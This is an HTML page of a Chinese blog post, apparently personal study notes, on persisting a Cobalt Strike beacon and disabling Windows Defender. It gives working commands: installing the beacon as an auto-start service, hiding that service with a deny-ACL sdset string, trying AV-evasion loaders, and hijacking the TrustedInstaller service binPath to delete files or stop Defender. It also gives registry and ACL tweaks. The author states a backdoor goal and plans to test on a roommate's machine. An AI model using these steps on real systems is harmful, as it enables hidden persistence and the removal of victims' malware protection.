<!DOCTYPE html><html lang="en" data-default-color-scheme="auto"><head><meta charset="UTF-8"><link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png"><link rel="icon" href="/img/fluid.png"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5,shrink-to-fit=no"><meta http-equiv="x-ua-compatible" content="ie=edge"><meta name="theme-color" content="#2f4154"><meta name="author" content="CDxiaodong"><meta name="keywords" content=""><meta name="description" content="只能说提权可以 删文件可以 改注册表可以 但是关掉wdf 得重启   将beacon写入服务并隐藏配合turated到停止defance。需管理员。且要关掉windowsdefance或者绕过它.txt sc create mrxn binPath&#x3D;C:&#x2F;Users&#x2F;mrxn.net&#x2F;Desktop&#x2F;mrxn.exe start&#x3D;auto"><meta property="og:type" content="article"><meta property="og:title" content="turated关掉windowsdefance"><meta property="og:url" content="http://example.com/turated%E5%85%B3%E6%8E%89windowsdefance.html"><meta property="og:site_name" content="CD_blog"><meta property="og:description" content="只能说提权可以 删文件可以 改注册表可以 但是关掉wdf 得重启   将beacon写入服务并隐藏配合turated到停止defance。需管理员。且要关掉windowsdefance或者绕过它.txt sc create mrxn binPath&#x3D;C:&#x2F;Users&#x2F;mrxn.net&#x2F;Desktop&#x2F;mrxn.exe start&#x3D;auto"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822015.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822398.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822676.jpeg"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822697.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822251.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822462.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822392.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822587.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822340.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822607.png"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/image-20220228175254867.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822258.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822177.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822937.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822513.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822781.png"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/image-20220228194502521.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201823761.png"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/image-20220228194547079.png"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/image-20220228194559093.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201823870.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201823164.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201823021.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201823807.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201823867.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201823111.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201823567.png"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/image-20220228200747777.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201823797.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201823608.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824057.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824080.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824142.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824225.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824382.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824118.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824160.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824190.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824145.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824829.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824923.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824700.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824507.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824495.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824979.png"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/image-20220228210725027.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824089.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824475.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824896.png"><meta property="og:image" content="e:/typora%E5%9B%BE%E7%89%87/image-20220228214545675.png"><meta property="og:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824758.png"><meta property="article:published_time" content="2022-04-09T15:20:00.000Z"><meta property="article:modified_time" content="2023-02-20T10:30:42.000Z"><meta property="article:author" content="CDxiaodong"><meta property="article:tag" content="学习笔记"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822015.png"><meta name="referrer" content="no-referrer-when-downgrade"><title>turated关掉windowsdefance - CD_blog</title><link rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css"><link rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css"><link rel="stylesheet" href="/css/main.css"><link id="highlight-css" rel="stylesheet" href="/css/highlight.css"><link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css"><link rel="stylesheet" href="/css/mac.css"><script id="fluid-configs">var Fluid=window.Fluid||{};Fluid.ctx=Object.assign({},Fluid.ctx);var dntVal,CONFIG={hostname:"example.com",root:"/",version:"1.9.4",typing:{enable:!0,typeSpeed:70,cursorChar:"_",loop:!1,scope:[]},anchorjs:{enable:!0,element:"h1,h2,h3,h4,h5,h6",placement:"left",visible:"hover",icon:""},progressbar:{enable:!0,height_px:3,color:"#29d",options:{showSpinner:!1,trickleSpeed:100}},code_language:{enable:!0,default:"TEXT"},copy_btn:!0,image_caption:{enable:!0},image_zoom:{enable:!0,img_url_replace:["",""]},toc:{enable:!0,placement:"right",headingSelector:"h1,h2,h3,h4,h5,h6",collapseDepth:0},lazyload:{enable:!0,loading_img:"/img/loading.gif",onlypost:!1,offset_factor:2},web_analytics:{enable:!0,follow_dnt:!0,baidu:null,google:null,gtag:null,tencent:{sid:null,cid:null},woyaola:null,cnzz:null,leancloud:{app_id:"eJkDJodFGiDL0TVTWRwDW40Z-gzGzoHsz",app_key:"xhVxcHFbhAlnmT8nFUbU2ps7",server_url:null,path:"window.location.pathname",ignore_local:!1}},search_path:"/local-search.xml"};CONFIG.web_analytics.follow_dnt&&(dntVal=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,Fluid.ctx.dnt=dntVal&&(dntVal.startsWith("1")||dntVal.startsWith("yes")||dntVal.startsWith("on")))</script><script src="/js/utils.js"></script><script src="/js/color-schema.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><header><div class="header-inner" style="height:70vh"><nav id="navbar" class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"><div class="container"><a class="navbar-brand" href="/"><strong>CD_blog</strong> </a><button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><div class="animated-icon"><span></span><span></span><span></span></div></button><div class="collapse navbar-collapse" id="navbarSupportedContent"><ul class="navbar-nav ml-auto text-center"><li class="nav-item"><a class="nav-link" href="/"><i class="iconfont icon-home-fill"></i> <span>Home</span></a></li><li class="nav-item"><a class="nav-link" href="/archives/"><i class="iconfont icon-archive-fill"></i> <span>Archives</span></a></li><li class="nav-item"><a class="nav-link" href="/categories/"><i class="iconfont icon-category-fill"></i> <span>Categories</span></a></li><li class="nav-item"><a class="nav-link" href="/tags/"><i class="iconfont icon-tags-fill"></i> <span>Tags</span></a></li><li class="nav-item"><a class="nav-link" href="/about/"><i class="iconfont icon-user-fill"></i> <span>About</span></a></li><li class="nav-item"><a class="nav-link" href="/links/"><i class="iconfont icon-link-fill"></i> <span>Links</span></a></li><li class="nav-item" id="search-btn"><a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search"><i class="iconfont icon-search"></i></a></li><li class="nav-item" id="color-toggle-btn"><a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle"><i class="iconfont icon-dark" id="color-toggle-icon"></i></a></li></ul></div></div></nav><div id="banner" class="banner" parallax="true" style="background:url(/img/default.png) no-repeat center center;background-size:cover"><div class="full-bg-img"><div class="mask flex-center" style="background-color:rgba(0,0,0,.3)"><div class="banner-text text-center fade-in-up"><div class="h2"><span id="subtitle" data-typed-text="turated关掉windowsdefance"></span></div><div class="mt-3"><span class="post-meta"><i class="iconfont icon-date-fill" aria-hidden="true"></i> <time datetime="2022-04-09 23:20" pubdate>April 9, 2022 pm</time></span></div><div class="mt-1"><span class="post-meta mr-2"><i class="iconfont icon-chart"></i> 8.1k words </span><span class="post-meta mr-2"><i class="iconfont icon-clock-fill"></i> 68 mins </span><span id="busuanzi_container_page_pv" style="display:none"><i class="iconfont icon-eye" aria-hidden="true"></i> <span id="busuanzi_value_page_pv"></span> views</span></div></div></div></div></div></div></header><main><div class="container-fluid nopadding-x"><div class="row nomargin-x"><div class="side-col d-none d-lg-block col-lg-2"></div><div class="col-lg-8 nopadding-x-md"><div class="container nopadding-x-md" id="board-ctn"><div id="board"><article class="post-content mx-auto"><h1 style="display:none">turated关掉windowsdefance</h1><div class="markdown-body"><p>只能说提权可以 删文件可以 改注册表可以 但是关掉wdf 得重启</p><p>将beacon写入服务并隐藏配合turated到停止defance。需管理员。且要关掉windowsdefance或者绕过它.txt</p><p>sc create mrxn binPath&#x3D;C:&#x2F;Users&#x2F;mrxn.net&#x2F;Desktop&#x2F;mrxn.exe start&#x3D;auto</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822015.png" srcset="/img/loading.gif" lazyload alt="image-20220227180109065"></p><p>&amp; $env:SystemRoot\System32\sc.exe sdset 1t “D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU) (D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;; SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)”</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822398.png" srcset="/img/loading.gif" lazyload alt="image-20220227180046037"></p><p>已经做好了 我们也写得是auto</p><p>可以自动启动。</p><p>接下来重开机试一下有没有上线</p><p>但是应该不会 因为defence会把它杀掉</p><p>刚开机的时候会出现两个黑框 然后瞬间消失 应该是被杀掉了</p><p>cs也没有上线。但是证明这个隐藏是可行的</p><p>接下来配合csbeacon免杀defence或者绕过或者关闭defence就行</p><p>想要使用tursyedlnstaller权限关闭defence实战中操作比较难。只使用与权限提升和留后门。不适合与这个自启动。</p><p>有两个原因：</p><p>1.提权trustedlnastaller这个操作难度大</p><p>2.即使关闭defence后也无法永久关闭。关闭后，如果机器重启的话会自动打开defence</p><p>3.即使永久关闭的话，对方发现的话就不太好。心大的话会再次开启defence。然后之前的后面就没用了</p><p>（后面证实 可以永久关闭defence！！！当然也就产生了第三个原因的坏处）</p><p>那么接下来就逐步进行</p><p>先使用cs免杀defence上线靶机并给予服务自启动</p><p>然后将服务隐藏</p><p>最后使用cs中的beacon进行实战操作从TrustedInstaller到停止WindowsDefender</p><p>为了更贴近个人主机。会先在靶机操作一遍，然后再到我舍友的机器试一下</p><p>这里先用schhhloader生成免杀看一下还能不能用</p><p>cs生成raw x64文件 （1.bin）</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822676.jpeg" srcset="/img/loading.gif" lazyload alt="IMG_20220228_162129"></p><p>上传试试</p><p>没有爆毒但是也没有上限</p><p>试一下gobybass</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822697.png" srcset="/img/loading.gif" lazyload alt="image-20220228171553170"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822251.png" srcset="/img/loading.gif" lazyload alt="image-20220228171725331"></p><p>奇怪 又是免杀但是不上线</p><p>好家伙 原来是我开国外代理的原因</p><p>被墙给拦了</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822462.png" srcset="/img/loading.gif" lazyload alt="image-20220228172838314"></p><p>ok 原来两个都能上线 不过这个shhloder需要设置延时 不然容易给断掉</p><p>可以看到shhh使用的是进程劫持来进行免杀</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822392.png" srcset="/img/loading.gif" lazyload alt="image-20220228173343877"></p><p>好家伙 我就再beacon运行一下whoami gobypass就被杀了</p><p>成功断掉</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822587.png" srcset="/img/loading.gif" lazyload alt="image-20220228173433436"></p><p>不出意外 shhhloder执行命令 也被杀了</p><p>这样看下来 我工具包里免杀全都被杀了</p><p>无所谓了 为了后续操作 直接再defence里面给后门文件允许存在</p><p>接下来</p><p>并给予服务自启动</p><p>然后将服务隐藏</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822340.png" srcset="/img/loading.gif" lazyload alt="image-20220228174544251"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822607.png" srcset="/img/loading.gif" lazyload alt="image-20220228174651602"></p><p>真的吐了 就算你允许其存在了 但是只要你有后续操作还是会杀</p><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20220228175254867.png" srcset="/img/loading.gif" lazyload alt="image-20220228175254867"></p><p>所以必须得做到cs的完全免杀才能运行指令</p><p>无语了</p><p>到底还是要免杀</p><p>而之后的操作2和3的顺序其实是可以调换的</p><h1 id="从TrustedInstaller到停止WindowsDefender"><a href="#从TrustedInstaller到停止WindowsDefender" class="headerlink" title="从TrustedInstaller到停止WindowsDefender"></a>从TrustedInstaller到停止WindowsDefender</h1><p>这里只讲利用方法</p><p>由于cs没做免杀的话基本上用不了。这里直接本地试一下</p><p>先直接命令关闭进程试一下、</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822258.png" srcset="/img/loading.gif" lazyload alt="image-20220228190233239"></p><p>没有权限</p><p>就算system权限也不行</p><p>为了能够关闭它</p><p>我们先升级到system权限</p><p>然后利用system权限升级到trustedinstaller权限</p><p>实战中如何提升到system权限就不用讲了 这个方法很多</p><p>dll劫持，白名单程序。域账户 lssas wmic</p><p>利用github上正好有份可以拿来看token的ps1非常方便</p><p><strong><a target="_blank" rel="noopener" href="https://gist.githubusercontent.com/vector-sec/a049bf12da619d9af8f9c7dbd28d3b56/raw/eaddf4151ebe4345623b7066a2c768665805fcad/Get-Token.ps1">https://gist.githubusercontent.com/vector-sec/a049bf12da619d9af8f9c7dbd28d3b56/raw/eaddf4151ebe4345623b7066a2c768665805fcad/Get-Token.ps1</a></strong></p><p>TrustedInstaller为Windows系统中众多系统内置安全主体中的一个，除了组之外也是系统重要服务，用户无法直接在此服务的上下文中运行程序或另一个服务。它是操作系统上用来对系统进行维护、更新等操作的组。SID是S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464。TrustedInstaller权限的意义是用来防止程序或用户无意或恶意破坏系统文件。这个安全主体本身是一个服务，名称为：Windows Modules Installer</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822177.png" srcset="/img/loading.gif" lazyload alt="image-20220228192051708"></p><p>一般常规情况下，进程默认打开未启动，需要先启动下服务才能启动<br>那么也就意味着要获得到TrustedInstaller的权限，需要先通过服务启动下</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822937.png" srcset="/img/loading.gif" lazyload alt="image-20220228192323456"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822513.png" srcset="/img/loading.gif" lazyload alt="image-20220228192332796"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201822781.png" srcset="/img/loading.gif" lazyload alt="image-20220228194454576"></p><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20220228194502521.png" srcset="/img/loading.gif" lazyload alt="image-20220228194502521"></p><p>了解下权限划分即可知道，在windows下TrustedInstaller权限其实超过了system，再回到为什么没法直接关闭WinDefend，查看WinDefend服务的dcal，可以发现管理员、system只有start的权限没法进行stop</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201823761.png" srcset="/img/loading.gif" lazyload alt="image-20220228194540072"></p><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20220228194547079.png" srcset="/img/loading.gif" lazyload alt="image-20220228194547079"></p><p>这个是<img src="E:/typora%E5%9B%BE%E7%89%87/image-20220228194559093.png" srcset="/img/loading.gif" lazyload alt="image-20220228194559093"></p><p>的属性</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201823870.png" srcset="/img/loading.gif" lazyload alt="image-20220228194615202"></p><p>一样只有turster才行</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201823164.png" srcset="/img/loading.gif" lazyload alt="image-20220228194629044"></p><p>但服务本身和TrustedInstaller具备完全控制，可以实现stop功能</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201823021.png" srcset="/img/loading.gif" lazyload alt="image-20220228194941762"></p><p>从管理员到system出发，利用winlogon获得system权限，通过StartService启动trustedinstaller服务，从而进步获取trustedinstaller的权限，利用trustedinstaller来停止defender</p><p>当然获取trustedinstaller的权限有很多方法，</p><p><strong>这个服务方法我暂时还没搞出来：</strong></p><p>先用用其他的方法</p><h2 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h2><p>创建一个txt文件</p><p>输入以下内容</p><p>Windows Registry Editor Version 5.00</p><p>[HKEY_CLASSES_ROOT*\shell\runas]</p><p>@&#x3D;”获取TrustedInstaller权限”</p><p>[HKEY_CLASSES_ROOT*\shell\runas\command]</p><p>@&#x3D;”cmd.exe &#x2F;c takeown &#x2F;f &quot;%1&quot; &amp;&amp; icacls &quot;%1&quot; &#x2F;grant administrators:F”</p><p>“IsolatedCommand”&#x3D;”cmd.exe &#x2F;c takeown &#x2F;f &quot;%1&quot; &amp;&amp; icacls &quot;%1&quot; &#x2F;grant administrators:F”</p><p>[HKEY_CLASSES_ROOT\Directory\shell\runas]</p><p>@&#x3D;”获取TrustedInstaller权限”</p><p>“NoWorkingDirectory”&#x3D;””</p><p>[HKEY_CLASSES_ROOT\Directory\shell\runas\command]</p><p>@&#x3D;”cmd.exe &#x2F;c takeown &#x2F;f &quot;%1&quot; &#x2F;r &#x2F;d y &amp;&amp; icacls &quot;%1&quot; &#x2F;grant administrators:F &#x2F;t”</p><p>“IsolatedCommand”&#x3D;”cmd.exe &#x2F;c takeown &#x2F;f &quot;%1&quot; &#x2F;r &#x2F;d y &amp;&amp; icacls &quot;%1&quot; &#x2F;grant administrators:F &#x2F;t”</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201823807.png" srcset="/img/loading.gif" lazyload alt="image-20220228195938524"></p><p><strong>将文档后缀.txt更改为注册表格式.reg</strong></p><p>先使用普通用户打开试试</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201823867.png" srcset="/img/loading.gif" lazyload alt="image-20220228200356482"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201823111.png" srcset="/img/loading.gif" lazyload alt="image-20220228200404904"></p><p>用管理员试试</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201823567.png" srcset="/img/loading.gif" lazyload alt="image-20220228200609213"></p><p>看来只能用 管理员</p><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20220228200747777.png" srcset="/img/loading.gif" lazyload alt="image-20220228200747777"></p><p>win7 成功可以 但是不难发现 win7的 defence 是是svchost.exe执行的</p><p>但是win10的是msmpeng.exe</p><p>之后再试一下 发现defence在一段时间后还是会自动打开</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201823797.png" srcset="/img/loading.gif" lazyload alt="image-20220228201127951"></p><p>win10试试</p><p>直接管理员运行</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201823608.png" srcset="/img/loading.gif" lazyload alt="image-20220228201243072"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824057.png" srcset="/img/loading.gif" lazyload alt="image-20220228201247977"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824080.png" srcset="/img/loading.gif" lazyload alt="image-20220228201324040"></p><h1 id="失败！！！！"><a href="#失败！！！！" class="headerlink" title="失败！！！！"></a>失败！！！！</h1><p>这个方法本来就不行</p><p>win7可以是因为win7版本低 没有做相关的防护 就算win7可以 一段时间后又不行了</p><h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><p>下载setacl</p><p><a target="_blank" rel="noopener" href="https://helgeklein.com/download/#setacl">https://helgeklein.com/download/#setacl</a></p><p>1、把下载解压好的程序SetACL.exe复制到C:\Windows\System32</p><p>2、以管理员身份运行命令提示符</p><p>3、按照如下格式设置执行获取权限命令：</p><p><strong>SetACL -on文件&#x2F;文件夹&#x2F;注册表值名称-ot文件类型-actn要执行的操作</strong></p><p>SetACL.exe -on “HKEY_CLASSES_ROOT\CLSID{5399E694-6CE5-4D6C-8FCE-1D8870FDCBA0}” -ot reg -actn setowner -ownr “n:Administrators”</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824142.png" srcset="/img/loading.gif" lazyload alt="image-20220228203903259"></p><p><strong>注释</strong>：将上述注册表项所有者更新到管理员Administrator（默认为不可更改的TrustedInstaller）</p><p>SetACL.exe -on “HKEY_CLASSES_ROOT\CLSID{5399E694-6CE5-4D6C-8FCE-1D8870FDCBA0}” -ot reg -actn ace -ace “n:Administrators;p:full”</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824225.png" srcset="/img/loading.gif" lazyload alt="image-20220228204106228"></p><p><strong>注释</strong>：让上述注册表项所有者“Administrator”获取全部权限。</p><p>注意，<strong>上述命令缺一不可，而且要按照先后顺序执行</strong>。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824382.png" srcset="/img/loading.gif" lazyload alt="image-20220228204318901"></p><p>给当前用户也加一下</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824118.png" srcset="/img/loading.gif" lazyload alt="image-20220228204402686"></p><h2 id="还是不行！！！！"><a href="#还是不行！！！！" class="headerlink" title="还是不行！！！！"></a>还是不行！！！！</h2><h1 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h1><p>输入regedit，按回车键进入注册表编辑器。</p><p>定位到</p><p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService</p><p>在右侧找到DWORD（32位）值，命名为Start。</p><p>修改数值数据为4。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824160.png" srcset="/img/loading.gif" lazyload alt="image-20220228204931699"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824190.png" srcset="/img/loading.gif" lazyload alt="image-20220228205001492"></p><p>重启文件资源管理器，或注销再登录&#x2F;重启系统。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824145.png" srcset="/img/loading.gif" lazyload alt="image-20220228205447399"></p><p>还是在 &#x3D; &#x3D; 下一个</p><h1 id="方法四（确定有用-win11也能用）"><a href="#方法四（确定有用-win11也能用）" class="headerlink" title="方法四（确定有用  win11也能用）"></a>方法四（确定有用 win11也能用）</h1><p>trustedInstaller（TI）组的概念</p><p>当系统资源被更改时，一个名为TrustedInstall的系统服务一定会被运行。我们使用SC模块也能发现这一点。</p><p>改变系统文件的权限实在不是个好主意，如果你做错了你会将操作系统暴露给EOP，尤其是对目录来说。资源管理器可以轻松地更改所有子文件和文件夹的安全属性为初始值。当然，TI会阻止你这么做的，但是总有些人出于某些目的而想要这么做。</p><p>你也许会想，我可以把当前用户添加到TI组中。不幸的是像NetLocalGroupAddMembers这样的LSASS api不使用SID，修改注册表值NT SERVICETrustedInstaller同样无效。因为它根本就不是一个真实的组，它是使用其他方法来创建的。也许你可以通过念一段神奇的咒语来完成这件事，或者至少使用底层的RPC调用，但我认为这么做不太值得。</p><p>因此，修改TI服务设置的最快方法是通过改变设置来运行一个其他的二进制文件。奇怪的是，TI服务使得系统上的文件很难被随意修改，但是它却不保护它自己，修改它的操作可以以一个普通管理员的权限完成。所以你可以使用下面的命令来删除任意文件</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">sc </span><span class="hljs-built_in">config</span> TrustedInstaller <span class="hljs-keyword">binPath= </span><span class="hljs-string">&quot;cmd.exe /C del pathtofile&quot;</span><br></code></pre></td></tr></table></figure><p>启动TI服务，咻的一声文件就没了。这条命令能够生效的另一个原因是，TI不是一个Protected Process Light (PPL)，这也是一件奇怪的事情，因为TI组被赋予了删除和停止PPL服务的权限。有大佬把这一点向MSRC<a target="_blank" rel="noopener" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=997">指出</a>过（并且Alex lonescu在2013年也<a target="_blank" rel="noopener" href="http://www.alex-ionescu.com/?p=116">这么做</a>了），但是微软并没有采取任何措施去修复。看起来微软也并不认为PPL是一个安全边界。</p><p>上述操作做完之后你必须把TI服务恢复到原来的状态，否则像Windows Update之类的服务就没法正常工作了。由于TI服务有一个token，那么我们是否可以借用这个token来创建一个新进程呢？</p><p>作为管理员，我们可以调用SeDebugPrivilege函数来打开TI进程和它的token。然后我们就可以做任何事情了，试一下吧：</p><p><strong>首先，我们需要下载并安装 Set-NtTokenPrivilege 命令所需模块，我们先在系统 C 盘根目录新建名为“token”的文件夹。</strong></p><p>接着，我们以管理员身份运行 Powershell，然后输入（其中 C:\token，为我们刚刚新建文件夹的路径）：</p><p>Save-Module -Name NtObjectManager -Path c:\token (记得翻墙下载！！！！！！！！)</p><p>并回车（第一次安装会出现询问，输入“Y”并回车）：</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824829.png" srcset="/img/loading.gif" lazyload alt="image-20220228211822811"></p><p>稍等片刻下载完成后，我们输入：</p><p>Install-Module -Name NtObjectManager</p><p>并回车，正式安装。若出现不受信任的存储库，输入“A”并回车：</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202302201824923.png" srcset="/img/loading.gif" lazyload alt="image-20220228212908738"></p><p>等安装结束后，需要让系统允许使用 Windows Powershell 脚本，输入以下命令：</p><p>Set-ExecutionPolicy 